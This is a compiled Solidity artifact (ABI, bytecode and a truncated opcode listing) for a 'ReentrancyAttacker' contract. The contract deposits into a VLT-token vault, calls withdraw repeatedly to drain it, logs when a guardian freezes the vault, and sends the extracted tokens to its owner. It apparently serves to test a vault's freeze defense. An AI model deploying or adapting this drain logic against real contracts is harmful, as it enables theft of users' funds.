{"contracts/ReentrancyAttacker.sol":{"ReentrancyAttacker":{"abi":[{"inputs":[{"internalType":"address","name":"_vault","type":"address"},{"internalType":"address","name":"_token","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"round","type":"uint256"},{"indexed":false,"internalType":"string","name":"reason","type":"string"}],"name":"AttackBlocked","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"totalExtracted","type":"uint256"},{"indexed":false,"internalType":"bool","name":"vaultFrozen","type":"bool"}],"name":"AttackComplete","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"depositAmount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"rounds","type":"uint256"}],"name":"AttackStarted","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"round","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"},{"indexed":false,"internalType":"uint256","name":"vaultRemainder","type":"uint256"}],"name":"RoundExecuted","type":"event"},{"inputs":[{"internalType":"uint256","name":"depositAmount","type":"uint256"},{"internalType":"uint256","name":"withdrawAmount","type":"uint256"},{"internalType":"uint256","name":"rounds","type":"uint256"}],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"attackRounds","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"attackRunning","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"exfiltrate","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getStatus","outputs":[{"internalType":"uint256","name":"contractVLT","type":"uint256"},{"internalType":"uint256","name":"vaultVLT","type":"uint256"},{"internalType":"uint256","name":"myVaultDeposit","type":"uint256"},{"internalType":"bool","name":"vaultFrozen","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"token","outputs":[{"internalType":"contract IERC20","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalExtracted","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"vault","outputs":[{"internalType":"contract IVault","name":"","type":"address"}],"stateMutability":"view","type":"function"}],"evm":{"bytecode":{"linkReferences":{},"object":"608060405234801561001057600080fd5b50604051610ed2380380610ed283398101604081905261002f9161008c565b600080546001600160a01b039384166001600160a01b03199182161790915560018054929093169181169190911790915560028054909116331790556100bf565b80516001600160a01b038116811461008757600080fd5b919050565b6000806040838503121561009f57600080fd5b6100a883610070565b91506100b660208401610070565b90509250929050565b610e04806100ce6000396000f3fe608060405234801561001057600080fd5b50600436106100935760003560e01c80638da5cb5b116100665780638da5cb5b146100fc57806394c7334014610127578063f81b78b61461012f578063fbfa77cf1461014c578063fc0c546a1461015f57600080fd5b806309d0cb5614610098578063407f85f8146100b45780634e69d560146100c957806376be27f5146100f3575b600080fd5b6100a160035481565b6040519081526020015b60405180910390f35b6100c76100c2366004610bc0565b610172565b005b6100d161086d565b60408051948552602085019390935291830152151560608201526080016100ab565b6100a160045481565b60025461010f906001600160a01b031681565b6040516001600160a01b0390911681526020016100ab565b6100c7610a46565b60055461013c9060ff1681565b60405190151581526020016100ab565b60005461010f906001600160a01b031681565b60015461010f906001600160a01b031681565b6002546001600160a01b031633146101bd5760405162461bcd60e51b81526020600482015260096024820152682737ba1037bbb732b960b91b60448201526064015b60405180910390fd5b60055460ff16156102095760405162461bcd60e51b815260206004820152601660248201527541747461636b20616c72656164792072756e6e696e6760501b60448201526064016101b4565b6001546040516370a0823160e01b815230600482015284916001600160a01b0316906370a0823190602401602060405180830381865afa158015610251573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102759190610bec565b10156102b65760405162461bcd60e51b815260206004820152601060248201526f125b9cdd59999a58da595b9d0815931560821b60448201526064016101b4565b6005805460ff191660011790556000600355600481905560408051848152602081018390527f6716b322fccc3352e152d32e902fc2871ba82dd1fb7e3196e9179a48b4f946e3910160405180910390a160015460005460405163095ea7b360e01b81526001600160a01b0391821660048201526024810186905291169063095ea7b3906044016020604051808303816000875af115801561035b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061037f9190610c05565b5060005460405163b6b55f2560e01b8152600481018590526001600160a01b039091169063b6b55f2590602401600060405180830381600087803b1580156103c657600080fd5b505af11580156103da573d6000803e3d6000fd5b506001925050505b8181116107b45760008054906101000a90046001600160a01b03166001600160a01b031663054f7d9c6040518163ffffffff1660e01b8152600401602060405180830381865afa15801561043a573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061045e9190610c05565b156104c457600080516020610daf833981519152816040516104b79181526040602082018190526018908201527f5661756c742066726f7a656e20627920477561726469616e0000000000000000606082015260800190565b60405180910390a16107b4565b600080546040516327e235e360e01b81523060048201526001600160a01b03909116906327e235e390602401602060405180830381865afa15801561050d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105319190610bec565b90508060000361059d57600080516020610daf8339815191528260405161058f9181526040602082018190526018908201527f41747461636b65722062616c616e636520647261696e65640000000000000000606082015260800190565b60405180910390a1506107b4565b6000818511156105ad57816105af565b845b600054604051632e1a7d4d60e01b8152600481018390529192506001600160a01b031690632e1a7d4d90602401600060405180830381600087803b1580156105f657600080fd5b505af1925050508015610607575060015b6106d057610613610c2e565b806308c379a0036106615750610627610c85565b806106325750610663565b600080516020610daf8339815191528482604051610651929190610d0f565b60405180910390a15050506107b4565b505b600080516020610daf833981519152836040516106c19181526040602082018190526021908201527f5265766572746564202866726f7a656e206f72206361702065786365656465646060820152602960f81b608082015260a00190565b60405180910390a150506107b4565b80600360008282546106e29190610d7c565b925050819055507f424026fe77074faf790196d0ae1e8e9bba0dc04570273f2a1fcc4d4367a502ea838260008054906101000a90046001600160a01b03166001600160a01b0316637d8820976040518163ffffffff1660e01b8152600401602060405180830381865afa15801561075d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107819190610bec565b6040805193845260208401929092529082015260600160405180910390a1505080806107ac90610d95565b9150506103e2565b506005805460ff1916905560035460005460408051630153df6760e21b815290517f905dec640f4d290c26939e6ebfe060c1403fd8ca31a476cb5a3fedab719c706393926001600160a01b03169163054f7d9c9160048083019260209291908290030181865afa15801561082c573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108509190610c05565b6040805192835290151560208301520160405180910390a1505050565b6001546040516370a0823160e01b81523060048201526000918291829182916001600160a01b03909116906370a0823190602401602060405180830381865afa1580156108be573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906108e29190610bec565b60008054906101000a90046001600160a01b03166001600160a01b0316637d8820976040518163ffffffff1660e01b8152600401602060405180830381865afa158015610933573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109579190610bec565b6000546040516327e235e360e01b81523060048201526001600160a01b03909116906327e235e390602401602060405180830381865afa15801561099f573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906109c39190610bec565b60008054906101000a90046001600160a01b03166001600160a01b031663054f7d9c6040518163ffffffff1660e01b8152600401602060405180830381865afa158015610a14573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610a389190610c05565b935093509350935090919293565b6002546001600160a01b03163314610a8c5760405162461bcd60e51b81526020600482015260096024820152682737ba1037bbb732b960b91b60448201526064016101b4565b6001546040516370a0823160e01b81523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa158015610ad5573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610af99190610bec565b905060008111610b435760405162461bcd60e51b81526020600482015260156024820152744e6f7468696e6720746f20657866696c747261746560581b60448201526064016101b4565b60015460025460405163a9059cbb60e01b81526001600160a01b0391821660048201526024810184905291169063a9059cbb906044016020604051808303816000875af1158015610b98573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610bbc9190610c05565b5050565b600080600060608486031215610bd557600080fd5b505081359360208301359350604090920135919050565b600060208284031215610bfe57600080fd5b5051919050565b600060208284031215610c1757600080fd5b81518015158114610c2757600080fd5b9392505050565b600060033d1115610c475760046000803e5060005160e01c5b90565b601f8201601f1916810167ffffffffffffffff81118282101715610c7e57634e487b7160e01b600052604160045260246000fd5b6040525050565b600060443d1015610c935790565b6040516003193d81016004833e81513d67ffffffffffffffff8160248401118184111715610cc357505050505090565b8285019150815181811115610cdb5750505050505090565b843d8701016020828501011115610cf55750505050505090565b610d0460208286010187610c4a565b509095945050505050565b8281526000602060406020840152835180604085015260005b81811015610d4457858101830151858201606001528201610d28565b506000606082860101526060601f19601f830116850101925050509392505050565b634e487b7160e01b600052601160045260246000fd5b80820180821115610d8f57610d8f610d66565b92915050565b600060018201610da757610da7610d66565b506001019056fec9b60329cdf09042f134b652a086075abf483e0bee4209bf8c104f57674ffbc6a264697066735822122014355eb50495ef1a3fd2f57b8d55d150bb58ca42e548a5aa74edc3b1b92337be64736f6c63430008180033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xED2 CODESIZE SUB DUP1 PUSH2 0xED2 DUP4 CODECOPY DUP2 ADD PUSH1 0x40 DUP2 SWAP1 MSTORE PUSH2 0x2F SWAP2 PUSH2 0x8C JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP4 DUP5 AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB NOT SWAP2 DUP3 AND OR SWAP1 SWAP2 SSTORE PUSH1 0x1 DUP1 SLOAD SWAP3 SWAP1 SWAP4 AND SWAP2 DUP2 AND SWAP2 SWAP1 SWAP2 OR SWAP1 SWAP2 SSTORE PUSH1 0x2 DUP1 SLOAD SWAP1 SWAP2 AND CALLER OR SWAP1 SSTORE PUSH2 0xBF JUMP JUMPDEST DUP1 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB DUP2 AND DUP2 EQ PUSH2 0x87 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x40 DUP4 DUP6 SUB SLT ISZERO PUSH2 0x9F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xA8 DUP4 PUSH2 0x70 JUMP JUMPDEST SWAP2 POP PUSH2 0xB6 PUSH1 0x20 DUP5 ADD PUSH2 0x70 JUMP JUMPDEST SWAP1 POP SWAP3 POP SWAP3 SWAP1 POP JUMP JUMPDEST PUSH2 0xE04 DUP1 PUSH2 0xCE PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x93 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B GT PUSH2 0x66 JUMPI DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xFC JUMPI DUP1 PUSH4 0x94C73340 EQ PUSH2 0x127 JUMPI DUP1 PUSH4 0xF81B78B6 EQ PUSH2 0x12F JUMPI DUP1 PUSH4 0xFBFA77CF EQ PUSH2 0x14C JUMPI DUP1 PUSH4 0xFC0C546A EQ PUSH2 0x15F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH4 0x9D0CB56 EQ PUSH2 0x98 JUMPI DUP1 PUSH4 0x407F85F8 EQ PUSH2 0xB4 JUMPI DUP1 PUSH4 0x4E69D560 EQ PUSH2 0xC9 JUMPI DUP1 PUSH4 0x76BE27F5 EQ PUSH2 0xF3 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xA1 PUSH1 0x3 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xC7 PUSH2 0xC2 CALLDATASIZE PUSH1 0x4 PUSH2 0xBC0 JUMP JUMPDEST PUSH2 0x172 JUMP JUMPDEST STOP JUMPDEST PUSH2 0xD1 PUSH2 0x86D JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP5 DUP6 MSTORE PUSH1 0x20 DUP6 ADD SWAP4 SWAP1 SWAP4 MSTORE SWAP2 DUP4 ADD MSTORE ISZERO ISZERO PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 ADD PUSH2 0xAB JUMP JUMPDEST PUSH2 0xA1 PUSH1 0x4 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x2 SLOAD PUSH2 0x10F SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xAB JUMP JUMPDEST PUSH2 0xC7 PUSH2 0xA46 JUMP JUMPDEST PUSH1 0x5 SLOAD PUSH2 0x13C SWAP1 PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0xAB JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x10F SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH2 0x10F SWAP1 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND DUP2 JUMP JUMPDEST PUSH1 0x2 SLOAD PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND CALLER EQ PUSH2 0x1BD JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x9 PUSH1 0x24 DUP3 ADD MSTORE PUSH9 0x2737BA1037BBB732B9 PUSH1 0xB9 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x5 SLOAD PUSH1 0xFF AND ISZERO PUSH2 0x209 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x16 PUSH1 0x24 DUP3 ADD MSTORE PUSH22 0x41747461636B20616C72656164792072756E6E696E67 PUSH1 0x50 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x1B4 JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE DUP5 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x251 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x275 SWAP2 SWAP1 PUSH2 0xBEC JUMP JUMPDEST LT ISZERO PUSH2 0x2B6 JUMPI PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x20 PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x10 PUSH1 0x24 DUP3 ADD MSTORE PUSH16 0x125B9CDD59999A58DA595B9D08159315 PUSH1 0x82 SHL PUSH1 0x44 DUP3 ADD MSTORE PUSH1 0x64 ADD PUSH2 0x1B4 JUMP JUMPDEST PUSH1 0x5 DUP1 SLOAD PUSH1 0xFF NOT AND PUSH1 0x1 OR SWAP1 SSTORE PUSH1 0x0 PUSH1 0x3 SSTORE PUSH1 0x4 DUP2 SWAP1 SSTORE PUSH1 0x40 DUP1 MLOAD DUP5 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP4 SWAP1 MSTORE PUSH32 0x6716B322FCCC3352E152D32E902FC2871BA82DD1FB7E3196E9179A48B4F946E3 SWAP2 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x1 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x95EA7B3 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP2 DUP3 AND PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x24 DUP2 ADD DUP7 SWAP1 MSTORE SWAP2 AND SWAP1 PUSH4 0x95EA7B3 SWAP1 PUSH1 0x44 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x35B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x37F SWAP2 SWAP1 PUSH2 0xC05 JUMP JUMPDEST POP PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0xB6B55F25 PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD DUP6 SWAP1 MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0xB6B55F25 SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3C6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3DA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x1 SWAP3 POP POP POP JUMPDEST DUP2 DUP2 GT PUSH2 0x7B4 JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x54F7D9C PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x43A JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x45E SWAP2 SWAP1 PUSH2 0xC05 JUMP JUMPDEST ISZERO PUSH2 0x4C4 JUMPI PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0xDAF DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP2 PUSH1 0x40 MLOAD PUSH2 0x4B7 SWAP2 DUP2 MSTORE PUSH1 0x40 PUSH1 0x20 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x18 SWAP1 DUP3 ADD MSTORE PUSH32 0x5661756C742066726F7A656E20627920477561726469616E0000000000000000 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH2 0x7B4 JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x27E235E3 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x27E235E3 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x50D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x531 SWAP2 SWAP1 PUSH2 0xBEC JUMP JUMPDEST SWAP1 POP DUP1 PUSH1 0x0 SUB PUSH2 0x59D JUMPI PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0xDAF DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP3 PUSH1 0x40 MLOAD PUSH2 0x58F SWAP2 DUP2 MSTORE PUSH1 0x40 PUSH1 0x20 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x18 SWAP1 DUP3 ADD MSTORE PUSH32 0x41747461636B65722062616C616E636520647261696E65640000000000000000 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x80 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP PUSH2 0x7B4 JUMP JUMPDEST PUSH1 0x0 DUP2 DUP6 GT ISZERO PUSH2 0x5AD JUMPI DUP2 PUSH2 0x5AF JUMP JUMPDEST DUP5 JUMPDEST PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH4 0x2E1A7D4D PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 DUP2 ADD DUP4 SWAP1 MSTORE SWAP2 SWAP3 POP PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP1 PUSH4 0x2E1A7D4D SWAP1 PUSH1 0x24 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x5F6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL SWAP3 POP POP POP DUP1 ISZERO PUSH2 0x607 JUMPI POP PUSH1 0x1 JUMPDEST PUSH2 0x6D0 JUMPI PUSH2 0x613 PUSH2 0xC2E JUMP JUMPDEST DUP1 PUSH4 0x8C379A0 SUB PUSH2 0x661 JUMPI POP PUSH2 0x627 PUSH2 0xC85 JUMP JUMPDEST DUP1 PUSH2 0x632 JUMPI POP PUSH2 0x663 JUMP JUMPDEST PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0xDAF DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP5 DUP3 PUSH1 0x40 MLOAD PUSH2 0x651 SWAP3 SWAP2 SWAP1 PUSH2 0xD0F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP POP PUSH2 0x7B4 JUMP JUMPDEST POP JUMPDEST PUSH1 0x0 DUP1 MLOAD PUSH1 0x20 PUSH2 0xDAF DUP4 CODECOPY DUP2 MLOAD SWAP2 MSTORE DUP4 PUSH1 0x40 MLOAD PUSH2 0x6C1 SWAP2 DUP2 MSTORE PUSH1 0x40 PUSH1 0x20 DUP3 ADD DUP2 SWAP1 MSTORE PUSH1 0x21 SWAP1 DUP3 ADD MSTORE PUSH32 0x5265766572746564202866726F7A656E206F7220636170206578636565646564 PUSH1 0x60 DUP3 ADD MSTORE PUSH1 0x29 PUSH1 0xF8 SHL PUSH1 0x80 DUP3 ADD MSTORE PUSH1 0xA0 ADD SWAP1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP PUSH2 0x7B4 JUMP JUMPDEST DUP1 PUSH1 0x3 PUSH1 0x0 DUP3 DUP3 SLOAD PUSH2 0x6E2 SWAP2 SWAP1 PUSH2 0xD7C JUMP JUMPDEST SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH32 0x424026FE77074FAF790196D0AE1E8E9BBA0DC04570273F2A1FCC4D4367A502EA DUP4 DUP3 PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND PUSH4 0x7D882097 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x75D JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x781 SWAP2 SWAP1 PUSH2 0xBEC JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP4 DUP5 MSTORE PUSH1 0x20 DUP5 ADD SWAP3 SWAP1 SWAP3 MSTORE SWAP1 DUP3 ADD MSTORE PUSH1 0x60 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP DUP1 DUP1 PUSH2 0x7AC SWAP1 PUSH2 0xD95 JUMP JUMPDEST SWAP2 POP POP PUSH2 0x3E2 JUMP JUMPDEST POP PUSH1 0x5 DUP1 SLOAD PUSH1 0xFF NOT AND SWAP1 SSTORE PUSH1 0x3 SLOAD PUSH1 0x0 SLOAD PUSH1 0x40 DUP1 MLOAD PUSH4 0x153DF67 PUSH1 0xE2 SHL DUP2 MSTORE SWAP1 MLOAD PUSH32 0x905DEC640F4D290C26939E6EBFE060C1403FD8CA31A476CB5A3FEDAB719C7063 SWAP4 SWAP3 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB AND SWAP2 PUSH4 0x54F7D9C SWAP2 PUSH1 0x4 DUP1 DUP4 ADD SWAP3 PUSH1 0x20 SWAP3 SWAP2 SWAP1 DUP3 SWAP1 SUB ADD DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x82C JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x850 SWAP2 SWAP1 PUSH2 0xC05 JUMP JUMPDEST PUSH1 0x40 DUP1 MLOAD SWAP3 DUP4 MSTORE SWAP1 ISZERO ISZERO PUSH1 0x20 DUP4 ADD MSTORE ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP POP JUMP JUMPDEST PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH4 0x70A08231 PUSH1 0xE0 SHL DUP2 MSTORE ADDRESS PUSH1 0x4 DUP3 ADD MSTORE PUSH1 0x0 SWAP2 DUP3 SWAP2 DUP3 SWAP2 DUP3 SWAP2 PUSH1 0x1 PUSH1 0x1 PUSH1 0xA0 SHL SUB SWAP1 SWAP2 AND SWAP1 PUSH4 0x70A08231 SWAP1 PUSH1 0x24 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x8BE JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 